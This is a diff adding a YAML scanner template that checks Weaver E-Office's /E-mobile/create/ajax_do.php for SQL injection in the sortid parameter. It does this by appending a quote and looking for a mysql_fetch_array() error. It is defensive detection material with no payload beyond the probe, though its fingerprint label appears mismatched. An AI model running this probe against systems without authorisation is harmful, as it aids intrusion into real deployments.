@@ -1,0 +1,30 @@
+id: poc-yaml-weaver-e-office-ajaxdo-php-sorid-sqli
+info:
+  name: 泛微-EOffice /E-mobile/create/ajax_do.php sortid参数 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: Endpoint Manager Mobile
+variables:
+  path: 'E-mobile/create/ajax_do.php?diff=addr&sortid=1
+
+    E-mobile/create/ajax_do.php?diff=word&sortid=1'
+requests:
+- method: GET
+  path: /{{.path}}
+  expression: 'status_code == 200 &&
+
+    contains(body,"<div align=\"center\">暂无相关数据...</div>") &&
+
+    !contains(body,"mysql_fetch_array()")
+
+    '
+- method: GET
+  path: /{{.path}}'
+  expression: 'status_code == 200 &&
+
+    contains(body,"mysql_fetch_array()")
+
+    '
+transport: http
